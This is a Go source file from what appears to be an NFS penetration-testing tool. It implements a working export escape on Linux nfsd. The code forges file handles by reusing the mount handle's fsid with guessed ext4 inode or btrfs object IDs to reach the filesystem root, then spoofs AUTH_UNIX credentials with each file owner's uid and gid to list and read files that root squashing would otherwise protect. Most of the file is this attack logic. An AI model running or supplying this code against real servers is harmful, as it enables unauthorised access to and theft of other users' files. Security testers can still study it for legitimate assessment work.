package nfs

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"io"
	"strings"

	nfs "github.com/AnvithLobo/nfsv3/nfs"
	"github.com/AnvithLobo/nfsv3/nfs/rpc"
)

// A Linux nfsd file handle is laid out as:
//
//	fb_ver | fb_auth | fb_fsid_type | fb_fileid_type | fsid | fileid
//
// The MOUNT service limits which directory a client may start from, but the
// handle itself is not restricted to it. Only the fsid identifies the
// filesystem, and nfsd reads exactly fb_fsid_type bytes of it, so a handle
// built from the mount handle's fsid with the file id replaced by the
// filesystem root object id resolves to the filesystem root. Appending the
// file id produces a handle longer than the mount handle, which is valid.
//
// nfsd authorises each request from the AUTH_UNIX credentials in the call. A
// file owned by another user is therefore read by issuing the request with
// that user's uid and gid, which are available from the entry attributes
// returned by READDIRPLUS.

// fsidLens maps the handle's fsid type byte to the encoded fsid length.
var fsidLens = map[byte]int{0: 8, 1: 4, 2: 12, 3: 8, 4: 8, 5: 8, 6: 16, 7: 24}

// escapeCandidate is a forged root handle with a label for the report.
type escapeCandidate struct {
	label string
	fh    []byte
}

// RootEscape reports the outcome of an escape attempt.
type RootEscape struct {
	Export     string
	Filesystem string
	MountFH    []byte
	EscapedFH  []byte
}

// RootEscape attempts to obtain a handle to the filesystem root and, if one is
// accepted, routes subsequent reads through it.
func (c *NFSClient) RootEscape() RootEscape {
	rep := RootEscape{Export: c.Export, Filesystem: "unknown"}

	mountFH, err := c.mountHandle()
	if err != nil {
		return rep
	}
	rep.MountFH = mountFH

	entries, _ := c.mount.ReadDirPlus(".")
	rep.Filesystem = detectFilesystem(entries)

	for _, cand := range forgeRootHandles(mountFH, rep.Filesystem) {
		// A candidate equal to the mount handle is the export root, which the
		// server always resolves. An export with no file id bytes of its own
		// produces only such candidates, and there is nothing to escape to.
		if bytes.Equal(cand.fh, mountFH) {
			continue
		}
		if _, err := c.mount.GetAttrFh(cand.fh); err != nil {
			continue
		}
		if _, err := c.mount.ReadDirPlusByFh(cand.fh); err != nil {
			continue
		}
		rep.EscapedFH = cand.fh
		c.escapedFH = cand.fh
		c.mount.SetFh(cand.fh)
		return rep
	}
	return rep
}

// mountHandle returns the handle MOUNT gave out for the export, taken from the
// "." entry of the export root.
func (c *NFSClient) mountHandle() ([]byte, error) {
	entries, err := c.mount.ReadDirPlus(".")
	if err != nil {
		return nil, err
	}
	for _, e := range entries {
		if e.FileName == "." && e.Handle.IsSet {
			return e.Handle.FH, nil
		}
	}
	return nil, fmt.Errorf("no handle for export root")
}

// detectFilesystem guesses the filesystem from the file id type byte of the
// entry handles.
func detectFilesystem(entries []*nfs.EntryPlus) string {
	for _, e := range entries {
		if !e.Handle.IsSet || len(e.Handle.FH) < 4 {
			continue
		}
		switch e.Handle.FH[3] {
		case 0x02, 0x81:
			return "ext4"
		case 0x4d, 0x4e, 0x4f:
			return "btrfs"
		}
	}
	return "unknown"
}

// forgeRootHandles builds candidate root handles from the mount handle. The
// fsid is copied verbatim and the file id is replaced. For ext4 the file id
// under fb_fileid_type 0x02 is three 32-bit words, inode | generation |
// parent inode, with the inode bytes stored reversed relative to big-endian.
func forgeRootHandles(mountFH []byte, filesystem string) []escapeCandidate {
	if len(mountFH) < 4 {
		return nil
	}

	fsidType := mountFH[2]
	fsidLen, ok := fsidLens[fsidType]
	if !ok || 4+fsidLen > len(mountFH) {
		fsidLen = len(mountFH) - 4
	}
	fsid := mountFH[4 : 4+fsidLen]

	ext4 := func(ino uint32) []byte {
		id := []byte{byte(ino), byte(ino >> 8), byte(ino >> 16), byte(ino >> 24)}
		return []byte{mountFH[0], mountFH[1], fsidType, 0x02, id[0], id[1], id[2], id[3], 0, 0, 0, 0, id[0], id[1], id[2], id[3]}
	}
	btrfs := func(objectID uint32) []byte {
		return []byte{mountFH[0], mountFH[1], fsidType, 0x4d, byte(objectID), byte(objectID >> 8), byte(objectID >> 16), byte(objectID >> 24), 0, 0, 0, 1}
	}

	join := func(head, fileID []byte) []byte {
		out := make([]byte, 0, len(head)+len(fsid)+len(fileID))
		out = append(out, head...)
		out = append(out, fsid...)
		out = append(out, fileID...)
		return out
	}

	var out []escapeCandidate
	if filesystem == "ext4" || filesystem == "unknown" {
		for _, ino := range []uint32{2, 128} {
			id := ext4(ino)
			out = append(out, escapeCandidate{
				label: fmt.Sprintf("ext4 ino=%d", ino),
				fh:    join(id[:4], id[4:]),
			})
		}
	}
	if filesystem == "btrfs" || filesystem == "unknown" {
		for objectID := uint32(1); objectID <= 16; objectID++ {
			id := btrfs(objectID)
			out = append(out, escapeCandidate{
				label: fmt.Sprintf("btrfs objectid=%d", objectID),
				fh:    join(id[:4], id[4:]),
			})
		}
	}
	return out
}

// Describe formats the result of an escape attempt for display.
func (r RootEscape) Describe() []string {
	out := []string{"Root escape"}
	out = append(out, fmt.Sprintf("  export:     %s", r.Export))
	out = append(out, fmt.Sprintf("  filesystem: %s", r.Filesystem))
	out = append(out, fmt.Sprintf("  mount:      %s", hex.EncodeToString(r.MountFH)))
	if r.EscapedFH == nil {
		out = append(out, "  result:     no candidate accepted, access stays within the export")
		return out
	}
	out = append(out, fmt.Sprintf("  root:       %s", hex.EncodeToString(r.EscapedFH)))
	out = append(out, "  result:     escaped")
	return out
}

// readEntries lists a directory. The directory is resolved to a handle with
// the credentials of each directory along the path, then listed with the
// credentials of the directory itself, because nfsd authorises each request
// from the credentials in the call and the mount credentials are not generally
// permitted to read the directory.
func (c *NFSClient) readEntries(path string) ([]*nfs.EntryPlus, error) {
	if c.escapedFH == nil {
		return c.mount.ReadDirPlus(path)
	}

	fh, attr, err := c.resolve(path)
	if err != nil {
		return nil, err
	}
	if attr.Type != nfs.NF3Dir {
		return nil, fmt.Errorf("%s is not a directory", path)
	}

	c.mount.SetCred(rpc.NewAuthUnix("root", attr.UID, attr.GID).Auth())
	defer c.mount.SetCred(rpc.Auth{})
	return c.mount.ReadDirPlusByFh(fh)
}

// resolve walks a path from the escaped root one component at a time, using
// the credentials of each directory to look up the entry inside it, and returns
// the final handle with its attributes. An empty path or "/" resolves to the
// escaped root.
func (c *NFSClient) resolve(path string) ([]byte, *nfs.Fattr, error) {
	fh := c.escapedFH
	attr, err := c.mount.GetAttrFh(fh)
	if err != nil {
		return nil, nil, err
	}

	clean := strings.Trim(path, "/")
	if clean == "" || clean == "." {
		return fh, attr, nil
	}

	for _, name := range strings.Split(clean, "/") {
		if attr.Type == nfs.NF3Dir {
			c.mount.SetCred(rpc.NewAuthUnix("root", attr.UID, attr.GID).Auth())
		}
		_, next, err := c.mount.LookupByFh(fh, name)
		if err != nil {
			c.mount.SetCred(rpc.Auth{})
			return nil, nil, err
		}
		fh = next
		attr, err = c.mount.GetAttrFh(fh)
		if err != nil {
			c.mount.SetCred(rpc.Auth{})
			return nil, nil, err
		}
	}
	return fh, attr, nil
}

// openRemote opens a file for reading.
//
// nfsd authorises every request from the credentials in the call, and root is
// normally squashed to an unprivileged user, so neither traversal nor the read
// can rely on the mount credentials. Each path component is resolved with the
// credentials of the directory that contains it, taken from that directory's
// attributes, and the file is opened and read with the credentials from its own
// attributes. This mirrors the order used by netexec.
func (c *NFSClient) openRemote(path string) (io.ReadCloser, int64, error) {
	if c.escapedFH == nil {
		f, err := c.mount.Open(path)
		if err != nil {
			return nil, 0, err
		}
		var size int64
		if attr, _, err := c.mount.GetAttr(path); err == nil {
			size = attr.Size()
		}
		return f, size, nil
	}

	fh, attr, err := c.resolve(path)
	if err != nil {
		return nil, 0, err
	}
	if attr.Type != nfs.NF3Reg {
		c.mount.SetCred(rpc.Auth{})
		return nil, 0, fmt.Errorf("%s is not a regular file", path)
	}

	// Open and read as the file's owner. The credential stays in place while
	// the reader is open because the read is issued after this returns, and is
	// cleared when the reader is closed.
	c.mount.SetCred(rpc.NewAuthUnix("root", attr.UID, attr.GID).Auth())

	f, err := c.mount.OpenByFh(fh, attr)
	if err != nil {
		c.mount.SetCred(rpc.Auth{})
		return nil, 0, err
	}
	f.SetOwner(attr.UID, attr.GID)
	return &ownerReader{File: f, c: c, uid: attr.UID, gid: attr.GID}, attr.Size(), nil
}

// ownerReader clears the owner credential from the mount target when the file
// is closed, so later operations use the credentials the client was started
// with.
type ownerReader struct {
	*nfs.File
	c        *NFSClient
	uid, gid uint32
}

func (r *ownerReader) Close() error {
	err := r.File.Close()
	r.c.mount.SetCred(rpc.Auth{})
	return err
}
